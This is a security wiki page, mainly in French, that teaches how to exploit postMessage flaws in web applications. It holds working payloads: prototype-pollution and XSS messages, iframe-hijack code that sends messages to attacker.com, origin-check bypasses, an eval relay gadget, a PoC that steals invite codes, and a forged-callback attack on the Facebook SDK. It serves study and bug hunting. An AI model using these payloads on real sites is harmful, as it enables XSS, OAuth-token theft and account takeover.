# PostMessage Vulnérabilités

{{#include ../../banners/hacktricks-training.md}}

## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut être '\*' ou une URL comme _https://company.com._\
Dans le **deuxième scénario**, le **message ne peut être envoyé qu'à ce domaine** (même si l'origine de l'objet Window est différente).\
Si le **wildcard** est utilisé, **les messages pourraient être envoyés à n'importe quel domaine**, et seront envoyés à l'origine de l'objet Window.

### Attaquer un iframe & wildcard dans **targetOrigin**

Comme expliqué dans [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page qui peut être **iframed** (pas de protection `X-Frame-Header`) et qui **envoie des messages sensibles** via **postMessage** en utilisant un **wildcard** (\*), vous pouvez **modifier** l'**origin** de l'**iframe** et **leak** le message **sensible** vers un domaine que vous contrôlez.\
Notez que si la page peut être iframed mais que le **targetOrigin** est **réglé sur une URL et non sur un wildcard**, ce **truc ne fonctionnera pas**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** est la fonction utilisée par JS pour déclarer la fonction qui **attend des `postMessages`**.\
Un code similaire au suivant sera utilisé:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- The use of **`indexOf()`** for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this vulnerability is:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` is intended for regular expressions, not strings. Passing anything other than a regexp leads to implicit conversion to regex, making the method potentially insecure. This is because in regex, a dot (.) acts as a wildcard, allowing for bypassing of validation with specially crafted domains. For instance:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, similar to `search()`, processes regex. If the regex is improperly structured, it might be prone to bypassing.
- The **`escapeHtml`** function is intended to sanitize inputs by escaping characters. However, it does not create a new escaped object but overwrites the properties of the existing object. This behavior can be exploited. Particularly, if an object can be manipulated such that its controlled property does not acknowledge `hasOwnProperty`, the `escapeHtml` won't perform as expected. This is demonstrated in the examples below:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

In the context of this vulnerability, the `File` object is notably exploitable due to its read-only `name` property. This property, when used in templates, is not sanitized by the `escapeHtml` function, leading to potential security risks.

- The `document.domain` property in JavaScript can be set by a script to shorten the domain, allowing for more relaxed same-origin policy enforcement within the same parent domain.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) you can often find a **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** to a supplied `targetOrigin`/`targetWindow`. Examples include marketing/analytics gadgets that take query params and forward `{msg_type, access_token, ...}` to `opener`/`parent`. You can:

- **Open the victim page in a popup/iframe that has an `opener`** so its handlers register (many pixels/SDKs only attach listeners when `window.opener` exists).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, populating message fields you want injected (message type, tokens, nonces).
- Because the message now comes **from the trusted origin**, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) consume messages like `FACEBOOK_IWL_BOOTSTRAP`, then **call backend APIs using a token supplied in the message** and include **`location.href` / `document.referrer`** in the request body. If you supply your own token, you can **read these requests in the token’s request history/logs** and exfil **OAuth codes/tokens** present in the URL/referrer of the victim page.
- Any relay that reflects arbitrary fields into `postMessage` lets you **spoof message types** expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows.

Hunting tips: enumerate `postMessage` listeners that only check `event.origin`, then look for **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Stitch both together with `window.open()` + `postMessage` to bypass origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Vous pouvez forcer **`e.source`** d'un message à être null en créant un **iframe** qui **envoie** le **postMessage** et est **supprimé immédiatement**.

Pour plus d'informations **lire :**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Pour réaliser ces attaques, dans l'idéal vous pourrez **mettre la page web victime** à l'intérieur d'un `iframe`. Mais certains en-têtes comme `X-Frame-Header` peuvent **empêcher** ce **comportement**.\
Dans ces scénarios, vous pouvez toujours utiliser une attaque moins discrète. Vous pouvez ouvrir un nouvel onglet vers l'application web vulnérable et communiquer avec elle :
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Voler un message envoyé au child iframe en bloquant la page main

Dans la page suivante, vous pouvez voir comment vous pourriez voler des **données postmessage sensibles** envoyées à un **child iframe** en **bloquant** la page **main** avant l'envoi des données et en abusant d'une **XSS dans le child** pour **leak the data** avant qu'elles ne soient reçues :


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Voler un message en modifiant la location de l'iframe

Si vous pouvez iframe une page web sans X-Frame-Header qui contient un autre iframe, vous pouvez **changer la location de ce child iframe**, donc s'il reçoit un **postmessage** envoyé avec un **wildcard**, un attaquant pourrait **changer** l'**origin** de cet iframe vers une page **contrôlée** par lui et **voler** le message :


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage vers Prototype Pollution et/ou XSS

Dans des scénarios où les données envoyées via `postMessage` sont exécutées par du JS, vous pouvez **iframe** la **page** et **exploiter** la **prototype pollution/XSS** en envoyant l'exploit via `postMessage`.

Quelques **XSS très bien expliqués via `postMessage`** peuvent être trouvés sur [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemple d'exploit pour abuser de **Prototype Pollution puis XSS** via un `postMessage` vers un `iframe` :
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Pour **plus d'informations**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### La allowlist des origines de confiance n'est pas une barrière

Une vérification stricte de `event.origin` ne fonctionne que si l'**origine de confiance ne peut pas exécuter de attacker JS**. Lorsque des pages privilégiées intègrent des iframes tiers et supposent que `event.origin === "https://partner.com"` est sûr, tout XSS dans `partner.com` devient un pont vers le parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Mode opératoire observé sur le terrain :

1. **Exploit XSS dans l'iframe du partenaire** et drop a relay gadget afin que tout `postMessage` devienne code exec à l'intérieur de l'origine de confiance :
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, envoyer du JS au compromised iframe qui relaie un allowed message type vers le parent. Le message provient de `partner.com`, passe l'allowlist et contient du HTML inséré de manière non sécurisée :
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Le parent injecte le HTML de l'attaquant, donnant **exécution JS dans l'origine parente** (par exemple, `facebook.com`), qui peut ensuite être utilisée pour voler des codes OAuth ou aboutir à une prise de contrôle complète du compte.

Key takeaways:

- **L'origine du partenaire n'est pas une frontière** : toute XSS dans un partenaire « de confiance » permet aux attaquants d'envoyer des messages autorisés qui contournent les vérifications `event.origin`.
- Les handlers qui **rendent des payloads contrôlés par le partenaire** (par ex., `innerHTML` sur certains types de messages) font d'une compromission du partenaire un same-origin DOM XSS.
- Une large **surface de messages** (beaucoup de types, pas de validation de structure) offre plus de gadgets pour pivoter une fois l'iframe partenaire compromise.

### Prédire les tokens de callback **`Math.random()`** dans les bridges postMessage

When message validation uses a “shared secret” generated with `Math.random()` (e.g., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) and the same helper also names plugin iframes, you can recover PRNG outputs and forge trusted messages:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Some SDKs expose a reinit path; in the FB SDK, firing `init:post` with `{xfbml:1}` forces `XFBML.parse()`, destroys/recreates the plugin iframe, and generates new names/callback IDs. Repeated reinit produces as many PRNG outputs as needed (note extra internal `Math.random()` calls for callback/iframe IDs, so solvers must skip intervening values).
- **Trusted-origin delivery via parameter pollution:** If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- **Predict the next callback:** Convertissez les noms d'iframe obtenus en floats dans `[0,1)` et alimentez plusieurs valeurs (même non consécutives) dans un prédicteur `Math.random` V8 (par ex., basé sur Z3). Générez localement le prochain `guid()` pour forger le token de callback attendu.
- **Trigger the sink:** Fabriquez les données postMessage de sorte que le bridge dispatch `xd.mpn.setupIconIframe` et injecte du HTML dans `iconSVG` (par ex., encodé en URL `<img src=x onerror=...>`), réalisant un DOM XSS à l'intérieur de l'origine hébergeant ; à partir de là, on peut lire les iframes same-origin (dialogues OAuth, arbiters, etc.).
- **Framing quirks help:** La chaîne requiert du framing. Dans certains webviews mobiles, `X-Frame-Options` peut dégrader vers l'option non supportée `ALLOW-FROM` lorsque `frame-ancestors` est présent, et des paramètres “compat” peuvent forcer des `frame-ancestors` permissifs, activant le canal latéral `window.name`.

#### Exemple minimal de message forgé
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Références

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Pour s'exercer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
